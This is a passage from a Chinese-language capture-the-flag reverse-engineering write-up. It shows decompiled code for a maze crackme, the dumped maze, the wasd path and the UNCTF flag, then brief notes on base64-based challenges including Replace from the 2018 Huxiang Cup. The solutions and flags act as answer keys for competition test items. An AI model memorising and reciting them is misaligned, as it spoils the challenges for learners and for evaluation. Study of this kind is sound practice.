class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 v3; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v5[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-270h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+C0h] [rbp-1B0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v7[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+D0h] [rbp-1A0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [rsp+190h] [rbp-E0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v9[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+1A0h] [rbp-D0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// [rsp+1BCh] [rbp-B4h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// [rsp+1C0h] [rbp-B0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [rsp+1C4h] [rbp-ACh]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v13; <span class="hljs-comment">// [rsp+1C8h] [rbp-A8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// [rsp+1CCh] [rbp-A4h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// [rsp+1D0h] [rbp-A0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// [rsp+1D4h] [rbp-9Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v17; <span class="hljs-comment">// [rsp+1D8h] [rbp-98h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v18; <span class="hljs-comment">// [rsp+1DCh] [rbp-94h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v19; <span class="hljs-comment">// [rsp+1E0h] [rbp-90h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v20; <span class="hljs-comment">// [rsp+1E4h] [rbp-8Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v21; <span class="hljs-comment">// [rsp+1E8h] [rbp-88h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v22; <span class="hljs-comment">// [rsp+1ECh] [rbp-84h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v23; <span class="hljs-comment">// [rsp+1F0h] [rbp-80h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v24; <span class="hljs-comment">// [rsp+1F4h] [rbp-7Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v25; <span class="hljs-comment">// [rsp+1F8h] [rbp-78h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v26; <span class="hljs-comment">// [rsp+1FCh] [rbp-74h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v27; <span class="hljs-comment">// [rsp+200h] [rbp-70h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v28; <span class="hljs-comment">// [rsp+204h] [rbp-6Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v29; <span class="hljs-comment">// [rsp+208h] [rbp-68h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v30; <span class="hljs-comment">// [rsp+20Ch] [rbp-64h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v31; <span class="hljs-comment">// [rsp+210h] [rbp-60h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v32; <span class="hljs-comment">// [rsp+214h] [rbp-5Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v33; <span class="hljs-comment">// [rsp+218h] [rbp-58h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v34; <span class="hljs-comment">// [rsp+21Ch] [rbp-54h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v35; <span class="hljs-comment">// [rsp+220h] [rbp-50h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v36; <span class="hljs-comment">// [rsp+224h] [rbp-4Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v37; <span class="hljs-comment">// [rsp+228h] [rbp-48h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v38; <span class="hljs-comment">// [rsp+22Ch] [rbp-44h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v39; <span class="hljs-comment">// [rsp+230h] [rbp-40h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v40; <span class="hljs-comment">// [rsp+234h] [rbp-3Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v41; <span class="hljs-comment">// [rsp+238h] [rbp-38h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v42; <span class="hljs-comment">// [rsp+23Ch] [rbp-34h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v43; <span class="hljs-comment">// [rsp+240h] [rbp-30h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v44; <span class="hljs-comment">// [rsp+244h] [rbp-2Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v45; <span class="hljs-comment">// [rsp+248h] [rbp-28h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v46; <span class="hljs-comment">// [rsp+24Ch] [rbp-24h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v47; <span class="hljs-comment">// [rsp+250h] [rbp-20h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v48; <span class="hljs-comment">// [rsp+254h] [rbp-1Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v49; <span class="hljs-comment">// [rsp+258h] [rbp-18h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v50; <span class="hljs-comment">// [rsp+25Ch] [rbp-14h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v51; <span class="hljs-comment">// [rsp+260h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v9[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">  v9[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">  v9[<span class="hljs-number">2</span>] = <span class="hljs-number">-1</span>;</span><br><span class="line">  v9[<span class="hljs-number">3</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">  v9[<span class="hljs-number">4</span>] = <span class="hljs-number">-1</span>;</span><br><span class="line">  v9[<span class="hljs-number">5</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">  v9[<span class="hljs-number">6</span>] = <span class="hljs-number">-1</span>;</span><br><span class="line">  v10 = <span class="hljs-number">0</span>;</span><br><span class="line">  v11 = <span class="hljs-number">0</span>;</span><br><span class="line">  v12 = <span class="hljs-number">0</span>;</span><br><span class="line">  v13 = <span class="hljs-number">0</span>;</span><br><span class="line">  v14 = <span class="hljs-number">1</span>;</span><br><span class="line">  v15 = <span class="hljs-number">-1</span>;</span><br><span class="line">  v16 = <span class="hljs-number">0</span>;</span><br><span class="line">  v17 = <span class="hljs-number">0</span>;</span><br><span class="line">  v18 = <span class="hljs-number">1</span>;</span><br><span class="line">  v19 = <span class="hljs-number">0</span>;</span><br><span class="line">  v20 = <span class="hljs-number">0</span>;</span><br><span class="line">  v21 = <span class="hljs-number">1</span>;</span><br><span class="line">  v22 = <span class="hljs-number">0</span>;</span><br><span class="line">  v23 = <span class="hljs-number">-1</span>;</span><br><span class="line">  v24 = <span class="hljs-number">-1</span>;</span><br><span class="line">  v25 = <span class="hljs-number">0</span>;</span><br><span class="line">  v26 = <span class="hljs-number">1</span>;</span><br><span class="line">  v27 = <span class="hljs-number">0</span>;</span><br><span class="line">  v28 = <span class="hljs-number">1</span>;</span><br><span class="line">  v29 = <span class="hljs-number">-1</span>;</span><br><span class="line">  v30 = <span class="hljs-number">0</span>;</span><br><span class="line">  v31 = <span class="hljs-number">-1</span>;</span><br><span class="line">  v32 = <span class="hljs-number">0</span>;</span><br><span class="line">  v33 = <span class="hljs-number">0</span>;</span><br><span class="line">  v34 = <span class="hljs-number">0</span>;</span><br><span class="line">  v35 = <span class="hljs-number">0</span>;</span><br><span class="line">  v36 = <span class="hljs-number">0</span>;</span><br><span class="line">  v37 = <span class="hljs-number">1</span>;</span><br><span class="line">  v38 = <span class="hljs-number">-1</span>;</span><br><span class="line">  v39 = <span class="hljs-number">-1</span>;</span><br><span class="line">  v40 = <span class="hljs-number">1</span>;</span><br><span class="line">  v41 = <span class="hljs-number">-1</span>;</span><br><span class="line">  v42 = <span class="hljs-number">0</span>;</span><br><span class="line">  v43 = <span class="hljs-number">-1</span>;</span><br><span class="line">  v44 = <span class="hljs-number">2</span>;</span><br><span class="line">  v45 = <span class="hljs-number">1</span>;</span><br><span class="line">  v46 = <span class="hljs-number">-1</span>;</span><br><span class="line">  v47 = <span class="hljs-number">0</span>;</span><br><span class="line">  v48 = <span class="hljs-number">0</span>;</span><br><span class="line">  v49 = <span class="hljs-number">-1</span>;</span><br><span class="line">  v50 = <span class="hljs-number">1</span>;</span><br><span class="line">  v51 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">memset</span>(v7, <span class="hljs-number">0</span>, <span class="hljs-number">0xC0</span>uLL);</span><br><span class="line">  v8 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">memset</span>(v5, <span class="hljs-number">0</span>, <span class="hljs-number">0xC0</span>uLL);</span><br><span class="line">  v6 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">Step_0</span>((<span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*)[<span class="hljs-number">7</span>])v9, <span class="hljs-number">7</span>, (<span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*)[<span class="hljs-number">7</span>])v7);</span><br><span class="line">  <span class="hljs-built_in">Step_1</span>((<span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*)[<span class="hljs-number">7</span>])v7, <span class="hljs-number">7</span>, (<span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*)[<span class="hljs-number">7</span>])v5);</span><br><span class="line">  v3 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;_bss_start, <span class="hljs-string">"Please help me out!"</span>);</span><br><span class="line">  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="hljs-built_in">Step_2</span>((<span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*)[<span class="hljs-number">7</span>])v5, <span class="hljs-number">7</span>);</span><br><span class="line">  <span class="hljs-built_in">system</span>(<span class="hljs-string">"pause"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>首先新建了三个地图，初始化了其中一个，然后利用下面两步分别初始化另外两个图</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">Step_0</span>((<span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*)[<span class="hljs-number">7</span>])v9, <span class="hljs-number">7</span>, (<span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*)[<span class="hljs-number">7</span>])v7);</span><br><span class="line"><span class="hljs-built_in">Step_1</span>((<span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*)[<span class="hljs-number">7</span>])v7, <span class="hljs-number">7</span>, (<span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*)[<span class="hljs-number">7</span>])v5);</span><br></pre></td></tr></tbody></table></figure><p>具体的操作在<code>Step_2((int (*)[7])v5, 7)</code>里，可以看到只用了最后的一个图，可以直接动态调试<code>dump</code>出地图来，然后看一下具体操作</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">Step_2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> (*a1)[<span class="hljs-number">7</span>])</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 result; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v6[<span class="hljs-number">35</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [rsp+33h] [rbp-Dh]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="hljs-number">0</span>;</span><br><span class="line">  v9 = <span class="hljs-number">0</span>;</span><br><span class="line">  v8 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( v8 &lt;= <span class="hljs-number">29</span> &amp;&amp; (*a1)[<span class="hljs-number">7</span> * v10 + v9] == <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    std::<span class="hljs-keyword">operator</span>&gt;&gt;&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cin, &amp;v7);</span><br><span class="line">    v1 = v8++;</span><br><span class="line">    v6[v1] = v7;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v7 == <span class="hljs-number">100</span> )</span><br><span class="line">    {</span><br><span class="line">      ++v9;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v7 &gt; <span class="hljs-number">100</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v7 == <span class="hljs-number">115</span> )</span><br><span class="line">      {</span><br><span class="line">        ++v10;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v7 != <span class="hljs-number">119</span> )</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_14;</span><br><span class="line">        --v10;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v7 == <span class="hljs-number">97</span> )</span><br><span class="line">    {</span><br><span class="line">      --v9;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">LABEL_14:</span><br><span class="line">      v2 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;_bss_start, <span class="hljs-string">"include illegal words."</span>);</span><br><span class="line">      std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v10 != <span class="hljs-number">6</span> || v9 != <span class="hljs-number">6</span> )</span><br><span class="line">  {</span><br><span class="line">    v5 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;_bss_start, <span class="hljs-string">"Oh no!,Please try again~~"</span>);</span><br><span class="line">    std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v5, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">    result = <span class="hljs-number">0LL</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v3 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;_bss_start, <span class="hljs-string">"Congratulations!"</span>);</span><br><span class="line">    std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="hljs-built_in">output</span>(v6, v8);</span><br><span class="line">    result = <span class="hljs-number">1LL</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>难度不是很大，经典的<code>wasd</code>，只能经过1的位置，走到最后就可以了，整个路径的操作就是flag，格式为<code>UNCTF{}</code></p><p><code>dump</code>出的地图为</p><figure class="highlight basic hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">1 </span><span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-symbol">1 </span><span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-symbol">1 </span><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-symbol">1 </span><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-symbol">1 </span><span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-symbol">1 </span><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span></span><br></pre></td></tr></tbody></table></figure><p>走出来就可以了</p><figure class="highlight ebnf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">ssddwdwdddssaasasaaassddddwdds</span></span><br></pre></td></tr></tbody></table></figure><p>验证一下</p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@rycbar17th:~<span class="hljs-comment"># ./easy_Maze </span></span><br><span class="line">Please <span class="hljs-built_in">help</span> me out!</span><br><span class="line">ssddwdwdddssaasasaaassddddwdds</span><br><span class="line">Congratulations!</span><br><span class="line">Thanks! Give you a flag: UNCTF{ssddwdwdddssaasasaaassddddwdds}</span><br><span class="line">sh: 1: pause: not found</span><br></pre></td></tr></tbody></table></figure><p>得到flag</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">UNCTF</span><span class="hljs-template-variable">{ssddwdwdddssaasasaaassddddwdds}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="ReverseMe-120"><a href="#ReverseMe-120" class="headerlink" title="ReverseMe-120"></a>ReverseMe-120</h4><p>将输入的字符串进行base64加密然后异或，和明文字符串进行对比</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( v18 &amp;&amp; *v19 &gt;= v13 )</span><br><span class="line">  {</span><br><span class="line">    v21 = <span class="hljs-number">3</span>;</span><br><span class="line">    v14 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> ( lengtha = <span class="hljs-number">0</span>; v5; --v5 )</span><br><span class="line">    {</span><br><span class="line">      v15 = *v7;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *v7 != <span class="hljs-number">13</span> &amp;&amp; v15 != <span class="hljs-number">10</span> &amp;&amp; v15 != <span class="hljs-number">32</span> )</span><br><span class="line">      {</span><br><span class="line">        v16 = byte_414E40[v15];</span><br><span class="line">        v21 -= v16 == <span class="hljs-number">64</span>;</span><br><span class="line">        v14 = v16 &amp; <span class="hljs-number">0x3F</span> | (v14 &lt;&lt; <span class="hljs-number">6</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span> ( ++lengtha == <span class="hljs-number">4</span> )</span><br><span class="line">        {</span><br><span class="line">          lengtha = <span class="hljs-number">0</span>;</span><br><span class="line">          <span class="hljs-keyword">if</span> ( v21 )</span><br><span class="line">            *v12++ = <span class="hljs-built_in">BYTE2</span>(v14);</span><br><span class="line">          <span class="hljs-keyword">if</span> ( v21 &gt; <span class="hljs-number">1</span> )</span><br><span class="line">            *v12++ = <span class="hljs-built_in">BYTE1</span>(v14);</span><br><span class="line">          <span class="hljs-keyword">if</span> ( v21 &gt; <span class="hljs-number">2</span> )</span><br><span class="line">            *v12++ = v14;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      ++v7;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>有很多的无用代码，这里是关键代码，可以看到每四个字节进行了拼接，输出为三个字节，很显然是base64。</p><h4 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h4><p>湖湘杯2018的题目，当时还参加过，那时候连这道题都毫无头绪<del>(真的菜</del></p><p>这就是个简单的换表题，先upx脱个壳</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// kr00_4</span></span><br><span class="line">  <span class="hljs-keyword">char</span> Buf; <span class="hljs-comment">// [esp+4h] [ebp-2Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> Dst; <span class="hljs-comment">// [esp+5h] [ebp-2Bh]</span></span><br><span class="line"></span><br><span class="line">  Buf = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;Dst, <span class="hljs-number">0</span>, <span class="hljs-number">0x27</span>u);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome The System\nPlease Input Key:"</span>);</span><br><span class="line">  <span class="hljs-built_in">gets_s</span>(&amp;Buf, <span class="hljs-number">0x28</span>u);</span><br><span class="line">  v3 = <span class="hljs-built_in">strlen</span>(&amp;Buf);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v3 - <span class="hljs-number">35</span>) &lt;= <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">sub_401090</span>((<span class="hljs-keyword">int</span>)&amp;Buf, v3) == <span class="hljs-number">1</span> )</span><br><span class="line">      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Well Done!\n"</span>);</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your Wrong!\n"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">sub_401090</span><span class="hljs-params">(<span class="hljs-keyword">int</span> input, <span class="hljs-keyword">int</span> length)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> _input; <span class="hljs-comment">// ebx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> index; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">char</span> 